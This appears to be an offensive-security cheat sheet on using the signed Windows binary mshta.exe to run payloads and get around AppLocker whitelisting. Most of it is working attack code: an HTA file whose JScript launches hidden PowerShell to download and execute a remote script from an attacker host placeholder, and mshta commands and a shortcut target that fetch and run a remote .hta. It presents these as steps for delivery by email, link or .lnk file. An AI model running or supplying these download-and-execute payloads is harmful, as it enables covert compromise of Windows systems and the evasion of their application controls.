# 03.02 HTA via mshta.exe

> HTML Application — LOLBin execution via mshta

## Overview

mshta.exe is a signed Microsoft binary in C:\Windows\System32. It runs .hta files containing embedded JScript or VBScript with full COM/ActiveX access. Because mshta is whitelisted by AppLocker default rules, it can also serve as an application whitelisting bypass. Deliver via email, shortcut file, or link.

## Steps

- **Create .hta file** — HTML wrapper with `<script language=JScript>` containing payload.
- **Host on Apache** — `python3 -m http.server 80` or Apache.
- **Shortcut delivery** — create .lnk pointing to `mshta.exe http://<LHOST>/payload.hta`.
- **Execute** — `mshta.exe payload.hta` or `mshta.exe http://<LHOST>/payload.hta`.

## Commands

### Minimal HTA launching PowerShell

```html
<html><head>
<script language="JScript">
var sh = new ActiveXObject('WScript.Shell');
sh.Run('powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString(\'http://<LHOST>/run.ps1\')"', 0);
window.close();
</script>
</head></html>
```

### Run HTA from command line

```cmd
mshta.exe http://<LHOST>/payload.hta

REM or from shortcut:
REM Target: C:\Windows\System32\mshta.exe http://<LHOST>/payload.hta
```
